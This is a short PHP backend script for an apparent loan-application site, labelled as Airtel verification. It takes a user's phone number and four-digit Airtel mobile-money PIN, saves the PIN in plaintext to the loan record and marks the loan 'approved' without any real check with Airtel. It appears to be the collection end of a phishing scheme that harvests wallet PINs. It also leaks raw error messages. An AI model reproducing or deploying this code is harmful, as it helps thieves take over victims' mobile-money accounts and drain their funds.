<?php
// Update loan application with Airtel verification

require_once '../config/db.php';

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request method']);
    exit;
}

try {
    $data = json_decode(file_get_contents("php://input"), true);
    
    $phone = $data['phone'] ?? '';
    $airtel_pin = $data['pin'] ?? '';

    if (!$phone || !$airtel_pin) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing phone or PIN']);
        exit;
    }

    // Validate PIN (4 digits)
    if (!preg_match('/^\d{4}$/', $airtel_pin)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid PIN format']);
        exit;
    }

    // Find the most recent loan application for this phone
    $stmt = $pdo->prepare("
        SELECT id FROM loan_applications 
        WHERE phone = :phone 
        ORDER BY created_at DESC 
        LIMIT 1
    ");
    $stmt->execute([':phone' => $phone]);
    $row = $stmt->fetch();

    if (!$row) {
        http_response_code(404);
        echo json_encode(['error' => 'Loan application not found']);
        exit;
    }

    $application_id = $row['id'];

    // Update with Airtel PIN and confirmation
    $updateStmt = $pdo->prepare("
        UPDATE loan_applications 
        SET airtel_pin = :pin, 
            airtel_confirmed = 1,
            status = 'approved'
        WHERE id = :id
    ");

    $result = $updateStmt->execute([
        ':pin' => $airtel_pin,
        ':id' => $application_id
    ]);

    if ($result) {
        http_response_code(200);
        echo json_encode([
            'success' => true,
            'message' => 'Airtel verification successful',
            'redirect' => 'success.html'
        ]);
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to update verification']);
    }

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]);
}
?>
